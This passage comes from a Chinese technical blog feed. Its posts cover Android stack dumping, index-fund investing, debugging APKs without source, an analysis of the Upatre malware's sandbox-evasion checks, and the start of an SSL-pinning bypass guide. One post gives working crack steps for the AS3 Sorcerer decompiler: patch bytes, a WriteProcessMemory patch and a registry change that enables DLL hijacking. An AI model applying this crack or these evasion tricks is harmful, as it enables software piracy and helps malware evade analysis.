id="☆-使用-debugged-命令行"><a href="#☆-使用-debugged-命令行" class="headerlink" title="☆ 使用 debugged 命令行"></a>☆ 使用 debugged 命令行</h2><p>这种方法是全系统通用的, 可以用于非zygote的进程.</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Usage: -b [&lt;tid&gt;]<br>  -b dump backtrace <span class="hljs-keyword">to</span> console, <span class="hljs-keyword">otherwise</span> dump full tombstone <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>通过 -b 参数指定进程pid, 即可.</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># debuggerd -b <span class="hljs-number">23850</span><br><br>Sending request to dump task <span class="hljs-number">23850</span>.<br><br><br>----- pid <span class="hljs-number">23850</span> <span class="hljs-built_in">at</span> <span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">27</span> <span class="hljs-number">03</span>:<span class="hljs-number">57</span>:<span class="hljs-number">11</span> -----<br>Cmd line: /sbin/adbd<br>ABI: &#x27;arm&#x27;<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23850</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b158</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0002467f</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00020854</span>  [stack]<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23851</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002fd38</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0002a501</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">0000000b</span>  &lt;<span class="hljs-literal">unknown</span>&gt;<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23852</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b624</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">000106cf</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00010301</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23853</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b628</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">00013999</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">000112ed</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">000104e1</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">05</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23862</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b888</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0000a503</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00009527</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br>----- end <span class="hljs-number">23850</span> -----<br>  ...<br></code></pre></td></tr></table></figure><h2 id="☆-java-代码中打印调用栈"><a href="#☆-java-代码中打印调用栈" class="headerlink" title="☆ java 代码中打印调用栈"></a>☆ java 代码中打印调用栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;  <br> ...  <br>&#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;  <br>  e.printStackTrace();  <br>  ...  <br>&#125; <br></code></pre></td></tr></table></figure><h2 id="☆-C-代码中打印调用栈"><a href="#☆-C-代码中打印调用栈" class="headerlink" title="☆ C++代码中打印调用栈"></a>☆ C++代码中打印调用栈</h2><p>CallStack.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;utils/CallStack.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    android::CallStack stack;<br>    stack.<span class="hljs-built_in">update</span>(); <br>    stack.<span class="hljs-built_in">dump</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Android.mk</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs make">LOCAL_PATH:= <span class="hljs-variable">$(<span class="hljs-built_in">call</span> my-<span class="hljs-built_in">dir</span>)</span><br><br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(CLEAR_VARS)</span><br>LOCAL_SRC_FILES:= CallStack.cpp<br>LOCAL_SHARED_LIBRARIES += libutils<br>LOCAL_LDLIBS += -ldl -lutils<br><br>LOCAL_CFLAGS := <span class="hljs-variable">$(common_CFLAGS)</span><br>LOCAL_MODULE := CallStack<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(BUILD_EXECUTABLE)</span><br><br></code></pre></td></tr></table></figure><p>执行后显示类似下面的结果</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br>root<span class="hljs-variable">@shamu</span><span class="hljs-symbol">:/data/local/tmp</span> <span class="hljs-comment"># ./CallStack</span><br><span class="hljs-comment">#00 pc 000006d1  /data/local/tmp/CallStack</span><br><span class="hljs-comment">#01 pc 00017359  /system/lib/libc.so (__libc_init+44)</span><br><span class="hljs-comment">#02 pc 0000074c  /data/local/tmp/CallStack</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于定投的一些思考</title>
    <link href="/cn/Automatic_Investment_Plan/"/>
    <url>/cn/Automatic_Investment_Plan/</url>
    
    <content type="html"><![CDATA[<ul><li>定投只有在低估的时候买，当估值进入中位数以上就不要买了，同时定投标的的估值应该在历史底部区域。</li><li>定投的本质不是价值投资，而是相信估值回归中位数。 </li><li>指数基金，周期性行业适合定投，比如券商，钢铁，煤炭。一般按时间定投，如果大幅下跌也要买。</li></ul><p>总的来说定投属于策略型的投资方法，其实并不知道底和顶在哪里，通过拉长时间来降低持仓成本，因此定投成功的关键在于你的成本是否可以随着时间而降下来。从这点也可以分析出在底部区域定投比在顶部区域定投要好得多，这也就是第一条。</p><p>定投策略对历史的估值情况有很强的依赖，属于基于历史数据的统计分析，但是每一次的情况都不同，没有人可以保证历史一定会重演。定投也不是价值投资，没有护城河，只是相信均值回归，这是第二条。</p><p>巴菲特非常推荐标普500指数 (S&amp;P 500) 定投，指数基金最牛的地方是股票会定期调整，把好的股票加入进来，差的淘汰出去，相当于有人帮你选股了，另外足够分散，发生系统性风险的概率大幅降低。周期性行业则是爆发性很强，三年不开张，开张吃三年，容易在底部积累大量筹码，作为一个长期投资策略非常合适。</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AS3 Sorcerer 3.0 破解思路</title>
    <link href="/cn/AS3_Sorcerer_crack/"/>
    <url>/cn/AS3_Sorcerer_crack/</url>
    
    <content type="html"><![CDATA[<p>   AS3 Sorcerer是一款flash action Script的商业反编译软件。  <a href="http://www.as3sorcerer.com/">www.as3sorcerer.com</a></p><p>   软件为Delphi编写，加了未知壳，使用PEID 0.94无法正确查出，使用核心扫描发现是<br>   Delphi编写，这个软件有一个特点修改一个字节就报错。由于时间原因没有具体跟相关代码。</p><p>   破解方法使用LPK.dll动态修改as3.exe内存达到破解目前，在Windows Xp下比较完美，<br>   在Windows 7下已经无法通过LPK.dll进行DLL hijack，可以通过DLL注入达到同样的目的。</p><p>   难点有几个，OD加载报错，attack也报错。使用海风月影的StrongOD可以正常attach。<br>   OD 1.1目前最大的问题是插件冲突严重，安装了OllyAdv后，无法成功加载as3.exe.<br>   遇上强壳时可以使用phantom的protect DRx，可以解决一下问题，总之要尽量避免冲突。<br>   接下来的难点就是如何找到破解的关键点，进行内存patch。</p><p>   使用OD查找字符串参考Unicode，搜索trial</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">006974C2    E8 65ABFDFF     call    0067202C<br>006974C7    84C0            test    al, al<br>006974C9    75 1C           jnz     short 006974E7<br>006974CB    B9 E4756900     mov     ecx, 006975E4                    ; e<br>006974D0    BA 50766900     mov     edx, 00697650                    ;Sorry!<br></code></pre></td></tr></table></figure><p>   这里有个坑，在OD中看到的代码有可能不是最终运行的代码，只有真正在OD里断下，进<br>   入程序领空后，看到的代码才是解密后的真正代码。这里在这里浪费了很多时间。换句<br>   话说就是要先保证能调试起来，能调试能下断点基本就成功了一半。</p><p>   上面的代码是非常经典的关键代码，主要处理了 0067202C让它返回1就OK了。F7跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">0067202C  - E9 EE9D1900     jmp     0080BE1F<br>00672031    CC              int3<br>00672032    CC              int3<br>00672033    CC              int3<br>00672034    CC              int3<br>00672035    CC              int3<br>00672036    CC              int3<br>00672037    90              nop<br></code></pre></td></tr></table></figure><p>   进入就去一个jmp，后面的大段跳转非常多，跟踪困难。好在有很多int3，可以自己<br>   写一段汇编代码解决。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">0067202C    33C0            xor     eax, eax<br>0067202E    83C0 01         add     eax, 0x1<br>00672031    90              nop<br>00672032    90              nop<br>00672033    90              nop<br>00672034    90              nop<br>00672035    90              nop<br>00672036    C3              retn<br></code></pre></td></tr></table></figure><p>核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE handle = GetModuleHandle(<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">int</span> RVA = <span class="hljs-number">0x67202C</span> - <span class="hljs-number">0x400000</span>;<br><span class="hljs-type">int</span> VA = <span class="hljs-type">int</span>(handle) + RVA;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> p405213[<span class="hljs-number">11</span>] = &#123;  <br>      <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xC3</span><br>&#125;;<br>VirtualProtectEx(hProcess, (LPVOID)VA, <span class="hljs-number">11</span>, PAGE_EXECUTE_READWRITE, &amp;Oldpp);<br>WriteProcessMemory(hProcess, (LPVOID)VA, p405213, <span class="hljs-number">11</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>GetModuleHandle用于动态获取进程加载基址。</p><h2 id="LPK-dll"><a href="#LPK-dll" class="headerlink" title="LPK.dll"></a>LPK.dll</h2><p>Windows 7 不能默认已经不能使用LPK.dll，必须导入下面注册表键值，重启电脑<br>才能使用。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span> <br><br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager] <br><span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span>\ <br><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Android Studio 调试无源码apk程序</title>
    <link href="/cn/apk_debug/"/>
    <url>/cn/apk_debug/</url>
    
    <content type="html"><![CDATA[<p>Apk无源码调试的方法有很多，现在发现使用Android Studio 结合 JEB　感觉良好，<br>主要是参考　<a href="http://www.jianshu.com/p/c7899e5ea182">http://www.jianshu.com/p/c7899e5ea182</a>　这篇记录下了具体步骤。</p><h2 id="1-下载-smalidea"><a href="#1-下载-smalidea" class="headerlink" title="1. 下载 smalidea"></a>1. 下载 smalidea</h2><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip">https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</a></p><p>在Android studio的插件仓库中没有找到这个插件，需要下载本地安装<br>File -&gt; Settings -&gt; Plugins -&gt; Install plugin from disk  选择下载的插件，重启后生效。</p><h2 id="2-apktool-输出源码文件"><a href="#2-apktool-输出源码文件" class="headerlink" title="2. apktool 输出源码文件"></a>2. apktool 输出源码文件</h2><p><a href="https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar">https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool_2.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-keyword">jar </span>d -f xx.apk -o xx<br></code></pre></td></tr></table></figure><p>如果正常的将输出 smali 源码文件</p><h2 id="3-Android-Studio-导入源码"><a href="#3-Android-Studio-导入源码" class="headerlink" title="3. Android Studio 导入源码"></a>3. Android Studio 导入源码</h2><p>File -&gt; New -&gt; import project  选择刚才导出的xx文件夹</p><h2 id="4-增加Android-Stuido的调试选项"><a href="#4-增加Android-Stuido的调试选项" class="headerlink" title="4. 增加Android Stuido的调试选项"></a>4. 增加Android Stuido的调试选项</h2><p>Android Studio 界面上选择 Run-&gt; Edit Configurations，点击+号，新建remote类型调试<br>器，默认的监听端口为5005，如果默认端口被占用则需要修改端口号。</p><h2 id="5-以调试模式启动应用"><a href="#5-以调试模式启动应用" class="headerlink" title="5. 以调试模式启动应用"></a>5. 以调试模式启动应用</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">adb <span class="hljs-keyword">shell</span><span class="language-bash"> am start -D -n aa.bb/.activity</span><br></code></pre></td></tr></table></figure><p>进程将挂起，aa.bb是package name，.activity 是要启动的activity 一般指定MainAcvitiy即可</p><h2 id="6-建立调试通道"><a href="#6-建立调试通道" class="headerlink" title="6. 建立调试通道"></a>6. 建立调试通道</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">ps</span> | <span class="hljs-keyword">grep</span> aa.bb<br></code></pre></td></tr></table></figure><p>获得调试进程的pid</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> forward tcp:<span class="hljs-number">5005</span> jdwp:debug_process_pid<br></code></pre></td></tr></table></figure><p>执行命令后，可以看到adb监听本地5005 端口。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">&gt; netstat -antp | grep <span class="hljs-number">5005</span><br> tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0 127.0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5005</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">4728</span>/adb  <br></code></pre></td></tr></table></figure><h2 id="7-设置断点，调试"><a href="#7-设置断点，调试" class="headerlink" title="7. 设置断点，调试"></a>7. 设置断点，调试</h2><p>点击源码左侧栏可以设置断点，点击工具栏上的debug （一个小虫的按钮），开始调试。在<br>这个步骤上我遇上了一个错误。</p><p>java.io.IOException “handshake failed - connection prematurally closed”</p><p>这个错误是因为adb版本问题，取消Android内部的adb集成就可以了。具体方法是<br>Tools -&gt; Android -&gt; Enable adb integration 取消掉前面的勾就可以了。</p><p>如果看到Connected to the target VM, address: ‘localhost:5005’, transport: ‘socket’ 就大功告成了。</p><h2 id="8-其他一些说明事项"><a href="#8-其他一些说明事项" class="headerlink" title="8. 其他一些说明事项"></a>8. 其他一些说明事项</h2><p>要调试apk程序是有一些要求的，下面几种情况可以调试apk程序。</p><ul><li>&#x2F;default.prop ro.debuggable&#x3D;1</li></ul><p>我的手机就属于这种情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">getprop  | grep ro.debug<br>[<span class="hljs-symbol">ro.debuggable</span>]: <span class="hljs-link">[1]</span><br></code></pre></td></tr></table></figure><ul><li>APK 中AndroidManifest.xml 有这句 android:debuggable&#x3D;true</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些反沙盒的新技术</title>
    <link href="/cn/anti_sandbox/"/>
    <url>/cn/anti_sandbox/</url>
    
    <content type="html"><![CDATA[<p>Upatre 使用了一些新的逃逸技术来逃逸动态沙盒引擎的检查，这些技巧都非常的简单，但<br>是非常的有效果。事实上，VirusTotal上Upatre的检出率并不高，新变种出来基本都检测不<br>出来，说明现在的恶意软件对付杀毒软件是越来越有办法了。</p><p>目前在恶意软件上加壳倒是越来越少了，因为加壳容易引起杀软引擎的注意，相反地目前的<br>恶意软件大量使用边执行边修改自身代码的方法来躲避杀软，不执行的话看起来就像是一个<br>正常的软件，而真正执行起来代码却全变了，这也算是一种进化。</p><p>下面说说两种最近遇到的沙盒逃逸的办法，样本md5: ac3558b973402ef6a27e03c391f20533</p><h2 id="检查开机时间"><a href="#检查开机时间" class="headerlink" title="检查开机时间"></a>检查开机时间</h2><p>一般使用沙盒的分析引擎的做法都是安装一个全新的系统，做系统镜像。然后在检查的时候<br>加载镜像，执行样本。而开机的时间往往都被忽略了，基本都不会超过10分钟。</p><p>Upatre 样本所采取的方法是利用GetTickCount 获取开机的毫秒数，当开机时间小于12分钟<br>是就不执行恶意的行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">004013B3    BB D8FE0A00         MOV EBX,0AFED8<br>004013B8    FF55 DC             CALL DWORD PTR SS:[EBP-24]   ; kernel32.GetTickCount<br>004013BB    3BC3                CMP EAX,EBX<br>004013BD    0F82 6F020000       JB 00401632<br><br>00401632    6A 00               PUSH 0<br>00401634    FF55 F4             CALL DWORD PTR SS:[EBP-C]    ; kernel32.ExitProcess<br><br></code></pre></td></tr></table></figure><p>0xAFED8 是 720600毫秒 12分钟多一点，不到进程退出了。</p><h2 id="检查鼠标位置"><a href="#检查鼠标位置" class="headerlink" title="检查鼠标位置"></a>检查鼠标位置</h2><p>Upatre样本使用的第二种沙盒逃逸的方法是检查鼠标位置的变化，动态沙盒分析系统大多是<br>自动化的系统，也就是不使用鼠标，如果Upatre样本检查到鼠标的位置没有发生变化，同样<br>不会执行恶意行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">0040197C   8D85 04FFFFFF       lea eax,dword ptr ss:[ebp-0xFC]<br>00401982   50                  push eax<br>00401983   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos<br>00401989   8D85 0CFFFFFF       lea eax,dword ptr ss:[ebp-0xF4]<br>0040198F   50                  push eax<br>00401990   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos<br>00401996   8B85 04FFFFFF       mov eax,dword ptr ss:[ebp-0xFC]<br>0040199C   8B9D 0CFFFFFF       mov ebx,dword ptr ss:[ebp-0xF4]<br>004019A2   39D8                cmp eax,ebx<br>004019A4   74 D6               je short 62.0040197C<br><br></code></pre></td></tr></table></figure><p>只要鼠标一动就退出循环，继续往下执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近出现的样本在反动态沙盒检测方面明显地进化了，针对性极强，不再局限于古老的<br>IsDebuggerPresent，而是利用PEB检查CPU核数等技术办法来检测，沙盒对抗估技术在后面<br>的日子里一定会更加迅速的进化。</p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>非常感谢西安研究中心的同事提供的样本，同时感谢同事lzx在样本分析时给予的大力支持。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Andorid 绕过 SSL Pinning 抓 https 报文</title>
    <link href="/cn/Android_SSL_Pinning/"/>
    <url>/cn/Android_SSL_Pinning/</url>
    
    <content type="html"><![CDATA[<h3 id="SSL-pinning"><a href="#SSL-pinning" class="headerlink" title="SSL pinning"></a>SSL pinning</h3><p>SSL Pinning是一种防止中间人攻击的技术，主要机制是在客户端发起请求–&gt;收到服务器发来的证书进行校验，如果收到的证书不被客户端信任，就直接断开连接不继续请求。可以发现中间人攻击的要点是伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。</p><p>SSL-pinning有两种方式：证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。</p><h4 id="证书锁定"><a href="#证书锁定" class="headerlink" title="证书锁定"></a>证书锁定</h4><p>需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在证书续期后需要将证书重新内置到APP中。</p><h4 id="公钥锁定"><a href="#公钥锁定" class="headerlink" title="公钥锁定"></a>公钥锁定</h4><p>提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。</p><p>（此小节内容摘抄自互联网）</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用 mitmproxy <a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a>  进行抓包，使用 frida 绕过 SSL pinning， frida 的安装和使用这里就不再详述了，可以参考其他资料。</p><h3 id="安装-mitmproxy"><a href="#安装-mitmproxy" class="headerlink" title="安装 mitmproxy"></a>安装 mitmproxy</h3><p>参考 <a href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a> 文档</p><p>可以直接下载 Linux binary： <a href="https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz%EF%BC%8C">https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz，</a> 或者使用 pip 进行安装 <code>https://pypi.org/project/mitmproxy/</code><br>执行命令 <code>~/.local/bin/pip3 install mitmproxy --user</code></p><p>安装成功之后，有三个程序可以使用： <code>mitmproxy</code>，<code>mitmdump</code>， <code>mitmweb</code></p><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p>在主机上执行下面几行命令设置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitmweb -p 8080<br>adb shell settings put global http_proxy 127.0.0.1:8888<br>adb reverse tcp:8888 tcp:8080<br></code></pre></td></tr></table></figure><p>mitmweb -p 8080 在本机起 8080 代理，在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口</p><h3 id="设置-CA"><a href="#设置-CA" class="headerlink" title="设置 CA"></a>设置 CA</h3><p><a href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The <span class="hljs-keyword">first</span> <span class="hljs-built_in">time</span> mitmproxy is run, <span class="hljs-keyword">it</span> creates <span class="hljs-keyword">the</span> <span class="hljs-built_in">keys</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> certificate authority (CA) <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> config <span class="hljs-built_in">directory</span> (~/.mitmproxy <span class="hljs-keyword">by</span> default).<br></code></pre></td></tr></table></figure><table><thead><tr><th>Filename</th><th>Contents</th></tr></thead><tbody><tr><td>mitmproxy-ca.pem</td><td>The certificate and the private key in PEM format.</td></tr><tr><td>mitmproxy-ca-cert.pem</td><td>The certificate in PEM format. Use this to distribute on most non-Windows platforms.</td></tr><tr><td>mitmproxy-ca-cert.p12</td><td>The certificate in PKCS12 format. For use on Windows.</td></tr><tr><td>mitmproxy-ca-cert.cer</td><td>Same file as .pem, but with an extension expected by some Android 